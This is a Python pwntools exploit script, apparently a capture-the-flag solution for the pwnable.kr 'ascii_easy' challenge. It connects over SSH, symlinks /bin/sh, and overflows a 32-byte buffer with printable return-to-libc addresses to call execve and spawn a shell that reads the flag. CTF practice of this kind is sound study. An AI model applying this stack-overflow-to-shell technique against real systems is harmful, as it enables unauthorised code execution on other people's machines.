#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 2222 --pass guest --user ascii_easy ./ascii_easy
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./ascii_easy')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 2222)
user = args.USER or 'ascii_easy'
password = args.PASSWORD or 'guest'
remote_path = 'ascii_easy'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

libc = ELF("./libc-2.15.so")
libc.address = 0x5555e000

CALL_EXECVE = 0x5561676a
NULL_ADDR = 0x55564a3a
PATH_ADDR = 0x556c2b59

PATH = libc.string(PATH_ADDR).decode()

io = start()

if args.LOCAL:
    system = os.system
else:
    system = shell

system(f'mkdir -p "{os.path.dirname(PATH)}"')
system(f'ln -s /bin/sh "{PATH}"')

payload = 32 * b"A"
payload += p32(CALL_EXECVE)
payload += p32(PATH_ADDR)  # filename
payload += p32(NULL_ADDR)  # argv = {NULL}
payload += p32(NULL_ADDR)  # envp = {NULL}

io = start(argv=[payload])
io.recvuntil(b"$ ")

io.sendline(b"cat flag")
log.success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip())}'")
